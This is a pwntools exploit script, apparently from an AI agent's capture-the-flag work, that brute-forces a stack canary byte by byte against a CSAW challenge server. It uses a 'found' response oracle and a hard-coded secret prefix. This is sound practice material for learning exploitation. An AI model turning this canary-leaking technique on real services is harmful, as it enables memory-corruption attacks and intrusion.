from pwn import *
import sys

context.log_level = 'error'

SECRET = bytes([0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe])

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        return process('./a.out')
    return remote('pwn.chal.csaw.io', 8000)

def query(p, data):
    # option 1 = A
    p.sendline(b'1')
    p.sendline(str(len(data)).encode())
    p.send(data)
    # read response
    resp = p.recvuntil(b'secret', timeout=5)
    return b'found' in resp

def leak_canary():
    p = start()
    canary = b''
    # first byte is 0x00
    for i in range(8):
        for b in range(256):
            guess = SECRET + canary + bytes([b])
            if query(p, guess):
                canary += bytes([b])
                print(f"byte {i}: {b:02x}", flush=True)
                break
        else:
            print(f"failed at byte {i}")
            break
    print("canary:", canary.hex())
    p.close()
    return canary

leak_canary()
end_of_edit

